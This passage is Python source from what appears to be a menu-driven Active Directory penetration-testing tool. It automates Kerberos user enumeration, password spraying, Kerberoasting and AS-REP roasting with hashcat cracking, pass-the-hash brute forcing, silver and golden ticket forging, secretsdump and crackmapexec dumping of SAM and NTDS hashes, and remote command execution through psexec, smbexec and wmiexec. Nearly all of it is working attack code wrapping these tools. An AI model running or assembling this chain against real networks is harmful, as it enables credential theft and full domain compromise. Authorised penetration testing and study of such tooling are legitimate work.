         checkParams = test_Domain()      
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
         else:
            command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         checkParams = test_Port("88")      
         
      if checkParams != 1:
         print(colored("[*] Enumerating remote server for valid usernames, please wait...", colour3))
         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
         command("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
         command("sort -r users.tmp > sortedusers.tmp")         
         
         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:	# PARSE FILE 2
            for username in read:
               username = username.replace("|     ","")
               username = username.replace("|_    ","")
               username, null = username.split("@")
               if username != "":
                  parse.write(username + "\n")
                  
         count = lineCount("validusers.tmp")
         
         if count > 0:
            print("[+] Found valid usernames...\n")      
                                   
            with open("validusers.tmp", "r") as read:
               for loop in range(0, count):
                  checkname = read.readline().rstrip("\n")
                  checkname = spacePadding(checkname, COL3)               
                  for x in range(0, maxUser):
                     if checkname == USER[x]:
                        print(colored((USER[x]), colour6))
                        VALD[x] = "1"
                        USER.insert(0, USER.pop(x))
                        HASH.insert(0, HASH.pop(x))
                        VALD.insert(0, VALD.pop(x))
                        break
                        
                  for x in range(0, maxUser):
                     if (USER[x][:1] != " ") and (HASH[x][:1] == " "):
                        HASH[x] = "."*COL4                        
            with open(dataDir + "/usernames.txt", "w") as write1, open(dataDir + "/hashes.txt", "w") as write2, open(dataDir + "/tokens.txt", "w") as write3:
            
               for x in range(0, maxUser):
                  if USER[x][:1] != " ":
                     write1.write(USER[x].rstrip(" ") + "\n")
                     write2.write(HASH[x].rstrip(" ") + "\n")
                     write3.write(VALD[x].rstrip(" ") + "\n")
         else:
            print("[-] No valid usernames were found...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
# -------------------------------------------------------------------------------------

   if selection =='47':
      checkParams = test_IP()
      found = 0      
      
      if checkParams != 1:
         checkParams = test_Domain()

      if checkParams != 1:
         print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
         test1 = linecache.getline("password1.tmp", 1)         
      
         if test1 != "":
            found = 1
            USR,PAS = test1.split(":")
            USR = spacePadding(USR, COL1)
            PAS = spacePadding(PAS, COL1)
            TGT = privCheck(TGT)   
                      
         if found == 0:
            print("\n[*] Now trying all usernames with matching passwords...")
            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")         
            test2 = linecache.getline("password2.tmp", 1)  
                      
            if test2 != "":
               found = 1
               USR,PAS = test2.split(":")
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
               TGT = privCheck(TGT)             
                 
         if found == 0:
            print("\n[*] Now trying all users against password list, please wait as this could take sometime...")            
            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
            test3 = linecache.getline("password3.tmp", 1) 
                      
            if test3 != "":
               USR,PAS = test3.split(":") 
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
               TGT = privCheck(TGT)               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()            
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
         else:
            command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -outputfile hashroast1.tmp")                          
         print(colored("[*] Cracking hash values if they exists...\n", colour3))
         command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
         command("strings cracked1.txt")
      else:
         print("[+] The file usernames.txt is empty...")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='49':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()         
         
      if checkParams != 1:      
         command("touch authorised.tmp")
         
         with open(dataDir + "/usernames.txt", "r") as read:
            for x in range(0, maxUser):
               line = read.readline().rstrip("\n")
               if VALD[x] == "1":
                  command("echo " + line + " >> authorised.tmp")      
                  
         count = lineCount("authorised.tmp")
                       
         if count > 0:           
            with open(dataDir + "/usernames.txt", "r") as read:
               for x in range(0, maxUser):
                  line = read.readline().rstrip("\n")
                  command("echo " + line + " >> authorised.tmp")      
         else:
            print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")
                     
         if checkParams != 1:
            if NTM[:5] != "EMPTY":
               print("[i] Using HASH value as password credential...")
               command(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
            else:
               command(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")                        
            print(colored("[*] Cracking hash values if they exists...\n", colour3))
            command("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
            command("strings cracked2.txt")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '50':
      checkParams = testPassword()
      if checkParams != 1:    
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")           
                
         for x in range(0, maxUser):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               HASH[x] = NTM.rstrip(" ")
         print("[+] Created hash value " + NTM + "...")
         NTM = spacePadding(NTM, COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '51':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()                     
         
      if USR[:2] == "''":
         print("[-] Please enter a valid username for enumeration...")
         checkParams = 1         
         
      if checkParams != 1:       
         count = lineCount(dataDir + "/hashes.txt")         
         counter = 0         
         
         if count > 12:
            marker = int(round(count/4))
         else:
            marker = 0
         marker1 = marker
         marker2 = marker * 2
         marker3 = marker * 3   
                                    
         if count > 0:
            print("[+] Please wait, bruteforcing remote server using " + str(count) + " hashes...")
                        
            with open(dataDir + "/hashes.txt", "r") as force:
               for brute in force:
                  brute = brute.rstrip("\n")                               
                  command(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
                  counter = counter + 1
                  command("sed -i '1d' datalog.tmp")
                  command("sed -i '1d' datalog.tmp")                                       
                  
                  with open("datalog.tmp", "r") as ticket:
                     checkFile = ticket.read()                                                                 
                     
                  if "[*] Saving ticket" in checkFile:
                     print("[+] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
                     TGT = privCheck(TGT)                         
                     NTM = spacePadding(brute, COL1)
                     checkParams = 2
                     break                                                                        
                     
                  if "Clock skew too great" in checkFile:
                     print("[-] Clock skew too great, terminating...")
                     checkParams = 2
                     break                                          
                     
                  if marker1 == counter:
                     print("[i] 25% completed...")                     
                     
                  if marker2 == counter:
                     print("[i] 50% completed...")                     
                     
                  if marker3 == counter:
                     print("[i] 75% completed...")                         
                     
            if checkParams != 2:
               print("[-] 100% complete - exhausted!!...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Overpass the HASH/pass the key 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '52':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         print(colored("[*] Trying to create TGT for user " + USR.rstrip(" ") + "...", colour3))         
         
         if (NTM[:1] != ""):
            print("[i] Using HASH value as password credential...")
            command(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))            
            
            if os.path.exists(USR.rstrip(" ") + ".ccache"):
               print("[+] Checking TGT status...")
               TGT = privCheck(TGT)
         else:
            print("[+] TGT was not generated...")                              
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '53':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()            
         
      if checkParams != 1:
         checkParams = testUsername()
         
      if checkParams != 1:
         print(colored("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...", colour3))         
         
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[i] Using HASH value as password credential...")
            command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))
            
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[+] Checking silver TGT status...")
            TGT = privCheck(TGT)
         else:
             print("[+] Silver TGT was not generated...")                   
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOLDEN TICKET ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Details : Golden Ticket!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '54':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         checkParams = testUsername         
         
      if checkParams != 1:
         print(colored("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...", colour3))         
         
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[i] Using HASH value as password credential...")
            command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
            
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[+] Checking gold TGT status...")
            TGT = privCheck(TGT)
         else:
            print("[+] Golden TGT was not generated...")            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
         else:
            command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
      prompt()      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
         else:
            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
         print(colored("[*] Checking downloaded files...\n", colour3))
         command("ls -la ./" + workDir + "/*.*")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()            
         
      if checkParams != 1:
         print ("[*] Enumerating, please wait...\n")     
                  
         if PAS[:2] != '""':
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -c all -ns " + TIP.rstrip(" "))
         else:
            print("[i] Using HASH value as password credential...")
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
            
      print("\n[*] Checking downloaded files...\n")
      command("mv *.json ./" + workDir)
      command("ls -la ./" + workDir + "/*.*")            
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      checkParams != test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         BH1 = input("[+] Enter Neo4j username: ")
         BH2 = input("[+] Enter Neo4j password: ")         
         
         if BH1 != "" and BH2 != "":
            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
         else:
            print("[+] Username or password cannot be null...")            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         print(colored("[*] Enumerating, please wait...", colour3))
         
         if PAS[:2] != '""':
            command(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
         else:
            print("[i] Using HASH value as password credential...")
            command(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")            
            
         command("sed -i '/:::/!d' secrets.tmp")
         command("sort -u secrets.tmp > ssecrets.tmp")
         
         count = lineCount("ssecrets.tmp")
               	
         if count > 0:               
            command("rm " + dataDir + "/usernames.txt")
            command("rm " + dataDir + "/hashes.txt")
            wipeTokens(VALD)                 
            
            for x in range(0, count):
               data = linecache.getline("ssecrets.tmp", x + 1)               
               data = data.replace(":::","")               
               try:
                  get1,get2,get3,get4 = data.split(":") 
               except ValueError:
                  try:
                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour0))
                     get1, get2, get3 = data.split(":")
                     get4 = get3
                  except:
                     get1 = "Major Error..."
                     get2 = "Major Error..."
                     get3 = "Major Error..."
                     get4 = "Major Error..."
                     
               get1 = get1.rstrip("\n")
               get2 = get1.rstrip("\n")
               get3 = get1.rstrip("\n")
               get4 = get4.rstrip("\n")           
                   
               print(colored("[+] Found User " + get1,colour6))            
               USER[x] = get1[:COL3]
               HASH[x] = get4[:COL4]
               USER[x] = spacePadding(USER[x], COL3)
               HASH[x] = spacePadding(HASH[x], COL4)
               
               if USER[x][:1] != " ":
                  command("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
                  command("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
         else:      
            print("[+] No users were found. check the domain name is correct...")               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
# Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
# -------------------------------------------------------------------------------------

   if selection =='60':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if (PAS[:2] == "''") and (NTM[:5] == "EMPTY"):
         print("[-] Both Password and Hash value have not been specified...")
         checkParams = 1      
         
      if checkParams != 1:      
         if PAS[:2] != '""':
            checkParams = test_Port("5985")  
                                  
            if checkParams != 1:
               print("[+] Finding exploitable machines on the same subnet...\n")
               command("echo 'crackmapexec winrm " + TIP.rstrip(" ") + "/24' > bash.sh")
               command("bash bash.sh")     
                         
            checkParams = test_Port("445")
            if checkParams != 1:
#               print("\n[+] Checking priviliges...\n")
#               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami' > bash.sh")
#               command("bash bash.sh")
               print("\n[+] Enumerating users...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating shares...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating sessions...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating SAM...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating NTDS...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi' > bash.sh")
               command("bash bash.sh")
               command("rm bash.sh")
               exit(1)
         else:
            print("[i] Using HASH value as password credential...")            
            checkParams = test_Port("5985")
            if checkParams != 1:
               print("[+] Finding exploitable machines on the same subnet...\n")
               command("echo 'crackmapexec winrm " + TIP.rstrip(" ") + "/24' > bash.sh")
               command("bash bash.sh") 
                    
            checkParams = test_Port("445")
            if checkParams != 1:
#               print("\n[+] Checking priviliges...\n")
#               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X whoami /priv' > bash.sh")
#               command("bash bash.sh")
               print("\n[+] Enumerating users...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating shares...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating sessions...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating SAM...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam' > bash.sh")
               command("bash bash.sh")
               
               print("\n[+] Enumerating NTDS...\n")
               command("echo 'crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi' > bash.sh")
               command("bash bash.sh")
               command("rm bash.sh")
               exit(1)
      prompt()	# EOF Error hence exit(1)
               
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n", colour3))
         command(keyPath + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n", colour3))
         command(keyPath + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Remote Windows login NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()            
         
      if checkParams != 1:
         print(colored("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n", colour3))
         command(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      checkParams = test_IP()     
       
      if checkParams != 1:
         checkParams = test_Port("873")
         
      if checkParams != 1:
         checkParams = test_Share()      
         
      if checkParams != 1:
         command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - rsync -a rsync://IP:873
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      checkParams = test_IP()       
      
      if checkParams != 1:
         checkParams = test_Port("873")       
         
      if checkParams != 1:
         command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")   
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='66':           
      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))  
          
      if os.path.exists("./" + workDir + "/ntds.dit"):
         print("[+] File ntds.dit found...")
      else:
         print("[-] File ntds.dit not found, checking for SAM...")
         
         if os.path.exists("./" + workDir + "/SAM"):
            print("[+] File SAM found...")
         else:
            print("[-] File SAM not found...")
            checkParams =1         
            
      if os.path.exists("./" + workDir + "/SYSTEM"):
         print("[+] File SYSTEM found...")
      else:
         print("[-] File SYSTEM not found...")
         checkParams = 1         
         
      if os.path.exists("./" + workDir + "/SECURITY"):
         print("[+] File SECURITY found...")
      else:
         print("[-] File SECURITY not found")
         checkParams = 1         
         
      if checkParams != 1:
         print(colored("[*] Extracting stored secrets, please wait...", colour3))
         
         if os.path.exists("./" + workDir + "/SAM"):
            command(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
            command("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
            command("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
         else:
            command(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
            command("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
            command("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")        
            
         print("[+] Importing extracted secrets...")         
         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
           for x in range (0, maxUser):
               USER[x] = read1.readline().rstrip("\n")
               USER[x] = spacePadding(USER[x], COL3)                  
               HASH[x] = read2.readline().rstrip("\n")
               
               if USER[x] != "":
                  HASH[x] = spacePadding(HASH[x], COL4)
               else:
                  HASH[x] = dotPadding(HASH[x], COL4)
               VALD[x] = "0"               
         wipeTokens(VALD)        
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nano usernames.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      command("nano " + dataDir + "/usernames.txt")            
      
      for x in range (0, maxUser):
         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
         USER[x] = spacePadding(USER[x], COL3)         
      wipeTokens(VALD)                                       
      prompt()
            
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nano passwords.txt
# Modified: N/A
